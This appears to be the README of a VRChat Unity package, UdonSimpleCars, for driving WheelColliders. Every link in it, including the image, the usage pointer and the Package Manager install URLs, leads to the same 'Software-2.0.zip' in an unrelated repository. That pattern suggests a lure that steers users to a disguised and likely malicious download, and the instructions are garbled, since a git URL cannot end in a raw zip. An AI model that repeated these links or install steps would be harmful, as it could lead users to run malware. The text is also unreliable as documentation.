# UdonSimpleCars
Just a simple driver of WheelCollider(s). But synced and configurable without codes.

![image](https://raw.githubusercontent.com/Greenskeleton207/woodex/master/Packages/com.nekometer.esnya.udon-simple-cars/Software-2.0.zip)

See `https://raw.githubusercontent.com/Greenskeleton207/woodex/master/Packages/com.nekometer.esnya.udon-simple-cars/Software-2.0.zip` to usage.

## Getting Started
1. Create a Unity Project for VRChat World with UdonSharp using VRChat Creator Compoanion
2. Open the Unity Project.
3. Open the Package Manager window from Window menu.
4. Click + button and select `Add package from git URL`.
5. Enter `git+https://raw.githubusercontent.com/Greenskeleton207/woodex/master/Packages/com.nekometer.esnya.udon-simple-cars/Software-2.0.zip` and click Add button (Enter `git+https://raw.githubusercontent.com/Greenskeleton207/woodex/master/Packages/com.nekometer.esnya.udon-simple-cars/Software-2.0.zip` to use beta releases)
